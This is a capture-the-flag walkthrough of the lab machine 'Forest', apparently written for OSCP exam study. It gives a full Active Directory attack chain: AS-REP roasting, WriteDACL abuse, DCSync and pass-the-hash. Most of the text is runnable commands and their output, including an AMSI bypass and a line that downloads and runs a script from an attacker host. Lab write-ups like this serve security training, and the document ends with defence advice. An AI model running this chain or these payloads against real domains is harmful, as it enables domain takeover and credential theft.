# Forest Attack Chain Documentation

**Target:** 10.10.10.161
**Domain:** htb.local
**DC:** FOREST.htb.local
**Difficulty:** Easy
**Attack Vector:** AS-REP Roasting → Account Operators → WriteDACL → DCSync

---

## Attack Path Diagram

```
[Nmap Scan]
     |
     v
[Anonymous LDAP] --> Discover svc-alfresco (no preauth)
     |
     v
[AS-REP Roast] --> Crack hash --> svc-alfresco:s3rvice
     |
     v
[WinRM Shell] --> Port 5985 --> Foothold
     |
     v
[BloodHound] --> svc-alfresco in Account Operators (nested)
     |
     v
[Create User] --> Add to "Exchange Windows Permissions"
     |
     v
[WriteDACL Abuse] --> Grant DCSync rights
     |
     v
[DCSync Attack] --> Dump Administrator NTLM hash
     |
     v
[Pass-the-Hash] --> SYSTEM shell
```

---

## Step 1: Initial Enumeration (Nmap)

### Command
```bash
nmap -p- --min-rate=1000 -T4 10.10.10.161 -oA nmap
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sC -sV 10.10.10.161
```

### Flags Explained
| Flag | Purpose |
|------|---------|
| `-p-` | Scan all 65535 ports |
| `--min-rate=1000` | Send at least 1000 packets/sec |
| `-T4` | Aggressive timing template |
| `-sC` | Default NSE scripts |
| `-sV` | Version detection |

### Key Indicators
| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | Domain Controller |
| 88 | Kerberos | AD authentication |
| 389/3268 | LDAP/GC | Directory services |
| 445 | SMB | File sharing |
| 5985 | WinRM | Remote management (shell access) |

### Requirements
- Network connectivity to target
- No credentials needed

### Verification
```bash
# Confirm DC
nmap -p389 --script ldap-rootdse 10.10.10.161
# Look for: namingContexts: DC=htb,DC=local
```

### What This Tells Us
- Windows Server 2016 Domain Controller
- Domain: `htb.local`
- WinRM enabled (potential shell access)
- Exchange likely installed (port 443 or Exchange-related services)

---

## Step 2: Anonymous LDAP Enumeration

### Command
```bash
ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" "(objectClass=user)" sAMAccountName
```

### Flags Explained
| Flag | Purpose |
|------|---------|
| `-x` | Simple (anonymous) authentication |
| `-H` | LDAP URI |
| `-b` | Base DN to search from |
| `"(objectClass=user)"` | Filter for user objects |

### Requirements
- LDAP null bind must be enabled (misconfiguration)

### Indicator: Null Bind Enabled
```bash
# Test if anonymous bind works
ldapsearch -x -H ldap://10.10.10.161 -b "" -s base namingContexts
# If returns data without auth = null bind enabled
```

### Verification
```bash
# Alternative tools
windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U
# Or
enum4linux -a 10.10.10.161
# Or
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"
```

### What We Discover
- User accounts: sebastien, lucinda, andy, mark, santi
- Service account: `svc-alfresco`
- Exchange system mailboxes (indicates Exchange Server)
- Group structure including Exchange Security Groups

---

## Step 3: AS-REP Roasting

### Background
AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled. The KDC returns an encrypted TGT without verifying identity first, allowing offline cracking.

### Command
```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat -outputfile asrep.hash
# Or for single user:
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```

### Flags Explained
| Flag | Purpose |
|------|---------|
| `-dc-ip` | Domain Controller IP |
| `-usersfile` | File containing usernames to test |
| `-no-pass` | Don't prompt for password |
| `-format hashcat` | Output in hashcat format (mode 18200) |

### Requirements
- User must have `DONT_REQ_PREAUTH` flag set (UAC 0x400000)
- No credentials needed to request AS-REP

### Indicator: Vulnerable Account
```bash
# Check UAC flags via LDAP
ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" "(sAMAccountName=svc-alfresco)" userAccountControl
# UAC 4260352 includes DONT_REQ_PREAUTH (0x400000)
```

### Verification
```bash
# If hash is returned, account is vulnerable
# Hash format: $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

### Why svc-alfresco is Vulnerable
Alfresco is a content management system that requires Kerberos pre-authentication disabled for its service account. This is a known configuration requirement.

---

## Step 4: Hash Cracking

### Command (John)
```bash
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
john asrep.hash --show
```

### Command (Hashcat)
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# -m 18200 = Kerberos 5 AS-REP etype 23
```

### Requirements
- Valid AS-REP hash
- Wordlist (rockyou.txt)
- Weak password

### Verification
```bash
# Verify cracked password works
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -d htb.local
# Expected: [+] htb.local\svc-alfresco:s3rvice
```

### Result
```
svc-alfresco:s3rvice
```

---

## Step 5: WinRM Access (Foothold)

### Command
```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

### Requirements
1. **Port 5985 open** (WinRM HTTP) or 5986 (HTTPS)
2. **User in Remote Management Users group** (or equivalent)
3. **Valid credentials**

### Check Requirements Before Connecting
```bash
# 1. Verify port is open
nmap -p5985 10.10.10.161

# 2. Verify credentials work
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
# Look for: (Pwn3d!) = can get shell
```

### Indicator: WinRM Access Available
```bash
# crackmapexec output showing "Pwn3d!" means shell access possible
# Without Pwn3d! = creds valid but no WinRM access
```

### Verification (After Connection)
```powershell
whoami
# htb\svc-alfresco

hostname
# FOREST

ipconfig
# Verify on target network
```

### User Flag
```powershell
type C:\Users\svc-alfresco\Desktop\user.txt
```

---

## Step 6: BloodHound Enumeration

### Purpose
Map Active Directory attack paths, identify privilege escalation routes through group memberships and ACLs.

### Collection Methods

**Method A: bloodhound-python (from Kali)**
```bash
# Sync time first (Kerberos requirement)
sudo ntpdate 10.10.10.161

bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.10.10.161 -c All
```

**Method B: SharpHound (on target)**
```powershell
# Upload SharpHound.exe via evil-winrm
upload SharpHound.exe

# Run collection
.\SharpHound.exe -c All

# Download results
download 20250101_BloodHound.zip
```

### Collection Flags
| Flag | Collects |
|------|----------|
| `-c All` | Everything (recommended) |
| `-c DCOnly` | LDAP only, no RPC to workstations |
| `-c Group,ACL` | Groups and permissions only |

### Key Findings
1. `svc-alfresco` is member of **9 groups** (nested membership)
2. Nested path includes **Account Operators**
3. **Exchange Windows Permissions** has **WriteDACL** on domain

### BloodHound Queries to Run
```cypher
# Find path from owned to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@HTB.LOCAL"})) RETURN p

# Find WriteDACL on domain
MATCH p=(g:Group)-[:WriteDacl]->(d:Domain) RETURN p

# Find Account Operators members
MATCH p=(u)-[:MemberOf*1..]->(g:Group {name:"ACCOUNT OPERATORS@HTB.LOCAL"}) RETURN p
```

---

## Step 7: Privilege Analysis - Account Operators

### What is Account Operators?
Built-in AD group that can:
- Create and modify user accounts
- Create and modify groups (non-protected)
- Log on to Domain Controllers locally

**Cannot modify protected groups:** Domain Admins, Enterprise Admins, Schema Admins, Administrators, Server Operators, Backup Operators, Account Operators itself

### How to Verify Membership
```powershell
# On target
whoami /groups
# Look for: HTB\Account Operators

# Or via net command
net user svc-alfresco /domain
# Check "Global Group memberships"

# Via PowerShell
Get-ADPrincipalGroupMembership svc-alfresco | Select Name
```

### Manual LDAP Check
```bash
# From Kali - check nested group membership
ldapsearch -x -H ldap://10.10.10.161 -D "svc-alfresco@htb.local" -w 's3rvice' \
  -b "dc=htb,dc=local" "(sAMAccountName=svc-alfresco)" memberOf
```

### Attack Implication
Can create users and add them to **Exchange Windows Permissions** (non-protected group).

---

## Step 8: Exchange Windows Permissions - WriteDACL Abuse

### What is Exchange Windows Permissions?
Default Exchange group created during Exchange installation. Due to a well-known misconfiguration, this group has **WriteDACL** permission on the domain object.

### Indicator: WriteDACL on Domain
**BloodHound Query:**
```cypher
MATCH p=(g:Group)-[:WriteDacl]->(d:Domain {name:"HTB.LOCAL"}) RETURN g.name
# Returns: EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
```

**Manual PowerView Check:**
```powershell
# Upload PowerView.ps1 first
. .\PowerView.ps1

# Check domain ACLs
Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs |
  ? {$_.ActiveDirectoryRights -match "WriteDacl"} |
  Select SecurityIdentifier, ActiveDirectoryRights

# Convert SID to name
ConvertFrom-SID S-1-5-21-...-ExchangeWindowsPermissionsSID
```

### Why This is Dangerous
WriteDACL allows modifying the DACL (permissions) on an object. If you can write to the domain's DACL, you can grant yourself any permission - including DCSync rights.

### Attack Path
```
Account Operators
     |
     | (can add users to non-protected groups)
     v
Exchange Windows Permissions
     |
     | (has WriteDACL on domain)
     v
Grant DCSync rights to controlled user
     |
     v
DCSync → Domain Admin hash
```

---

## Step 9: Create Malicious User

### Commands
```powershell
# Create new domain user
net user pwned Password123! /add /domain

# Add to Exchange Windows Permissions (for WriteDACL)
net group "Exchange Windows Permissions" pwned /add

# Add to Remote Management Users (for WinRM access)
net localgroup "Remote Management Users" pwned /add
```

### Requirements
- Membership in Account Operators (or equivalent)
- Target group must not be protected

### Verification
```powershell
# Verify user created
net user pwned /domain

# Verify group membership
net group "Exchange Windows Permissions" /domain
# Should list: pwned

# Test new user can authenticate
# From Kali:
crackmapexec smb 10.10.10.161 -u 'pwned' -p 'Password123!' -d htb.local
```

### Why Create New User?
- Clean separation of attack stages
- Can use new user's credentials for DCSync
- Avoids modifying svc-alfresco's permissions

---

## Step 10: Grant DCSync Rights (WriteDACL Abuse)

### What is DCSync?
DCSync mimics a Domain Controller requesting replication data. Requires these rights on the domain:
- **DS-Replication-Get-Changes** (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- **DS-Replication-Get-Changes-All** (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

### Method A: PowerView (Recommended)
```powershell
# Import PowerView
. .\PowerView.ps1

# Create credential object for new user
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\pwned', $pass)

# Grant DCSync rights
Add-DomainObjectAcl -PrincipalIdentity pwned -Credential $cred -Rights DCSync

# This adds both required replication rights to the domain object
```

### Method B: Manual ACL Modification
```powershell
# Get domain distinguished name
$domainDN = "DC=htb,DC=local"

# Get user SID
$userSID = (Get-ADUser pwned).SID

# Create ACE for DS-Replication-Get-Changes
$guid1 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSID, "ExtendedRight", "Allow", $guid1
)

# Create ACE for DS-Replication-Get-Changes-All
$guid2 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSID, "ExtendedRight", "Allow", $guid2
)

# Apply ACEs
$domain = [ADSI]"LDAP://$domainDN"
$domain.ObjectSecurity.AddAccessRule($ace1)
$domain.ObjectSecurity.AddAccessRule($ace2)
$domain.CommitChanges()
```

### Verification
```powershell
# Check if rights were granted
Get-DomainObjectAcl -Identity "DC=htb,DC=local" -ResolveGUIDs |
  ? {$_.SecurityIdentifier -match "pwned"} |
  Select ActiveDirectoryRights, ObjectAceType
# Should show: ExtendedRight for DS-Replication-Get-Changes[-All]
```

---

## Step 11: DCSync Attack

### Requirements
- DS-Replication-Get-Changes on domain
- DS-Replication-Get-Changes-All on domain
- Network access to DC

### Method A: Mimikatz (On Target)
```powershell
# Upload mimikatz.exe
upload mimikatz.exe

# Run DCSync for Administrator
.\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:Administrator" exit

# Or for all users
.\mimikatz.exe "lsadump::dcsync /domain:htb.local /all /csv" exit
```

**Expected Output:**
```
[DC] 'htb.local' will be the domain
[DC] 'FOREST.htb.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator
SAM Username         : Administrator
Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
```

### Method B: Invoke-Mimikatz (PowerShell)
```powershell
# Bypass AMSI first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Load Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')

# Execute DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:htb.local /user:Administrator"'
```

### Method C: impacket-secretsdump (From Kali)
```bash
impacket-secretsdump htb.local/pwned:'Password123!'@10.10.10.161
# Or with hash:
impacket-secretsdump htb.local/pwned@10.10.10.161 -hashes :NTLM_HASH
```

**Expected Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Key Hashes Obtained
| Account | NTLM Hash |
|---------|-----------|
| Administrator | 32693b11e6aa90eb43d32c72a07ceea6 |
| krbtgt | 819af826bb148e603acb0f33d17632f8 |

---

## Step 12: Pass-the-Hash (SYSTEM Access)

### Requirements
- Administrator NTLM hash
- SMB access (port 445) or WinRM (port 5985)

### Method A: impacket-psexec
```bash
impacket-psexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

**How it works:**
1. Uploads executable to ADMIN$ share
2. Creates and starts a service
3. Connects to named pipe for shell
4. Returns SYSTEM shell

### Method B: evil-winrm with Hash
```bash
evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

### Method C: impacket-wmiexec
```bash
impacket-wmiexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

### Method D: crackmapexec Command Execution
```bash
# Single command
crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x "type C:\Users\Administrator\Desktop\root.txt"

# Interactive-ish via multiple commands
crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x "whoami && hostname"
```

### Method E: Mimikatz Pass-the-Hash (On Compromised Host)
```
mimikatz# sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:32693b11e6aa90eb43d32c72a07ceea6 /run:cmd.exe
```

### Verification
```powershell
whoami
# nt authority\system

hostname
# FOREST
```

### Root Flag
```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Permission Verification Commands Reference

| Step | What to Check | Command |
|------|---------------|---------|
| 2 | LDAP null bind | `ldapsearch -x -H ldap://IP -b "" -s base` |
| 3 | AS-REP vulnerable users | `GetNPUsers.py domain/ -dc-ip IP -usersfile users.txt` |
| 5 | WinRM access | `crackmapexec winrm IP -u user -p pass` |
| 7 | Account Operators membership | `whoami /groups` or `net user USER /domain` |
| 8 | WriteDACL on domain | BloodHound or `Get-DomainObjectAcl -Identity "DC=x,DC=y"` |
| 9 | User created | `net user USER /domain` |
| 10 | DCSync rights granted | `Get-DomainObjectAcl` check for replication GUIDs |
| 11 | DCSync works | Hash returned from secretsdump/mimikatz |
| 12 | Admin access | `whoami` returns SYSTEM or Administrator |

---

## Defense Recommendations

| Step | Vulnerability | Mitigation |
|------|---------------|------------|
| 2 | Anonymous LDAP | Disable null bind, require authentication |
| 3 | AS-REP Roasting | Enable preauth for all accounts, use strong passwords |
| 5 | WinRM exposure | Limit Remote Management Users, use JEA |
| 7 | Account Operators | Minimize membership, audit regularly |
| 8 | Exchange WriteDACL | Apply Exchange security patches, run `Setup.exe /PrepareAD` |
| 10 | WriteDACL abuse | Monitor ACL changes on domain object |
| 11 | DCSync | Alert on replication from non-DC IPs |
| 12 | Pass-the-Hash | Enable Credential Guard, use Protected Users group |

---

## OSCP Exam Notes

- **Time estimate:** 2-3 hours for full chain
- **Manual alternatives exist for every step** - no reliance on single tools
- **Key skills tested:** AD enumeration, Kerberos attacks, ACL abuse, credential attacks
- **BloodHound is not required** - can identify paths manually with PowerView
- **Document everything** - especially permission checks before each step
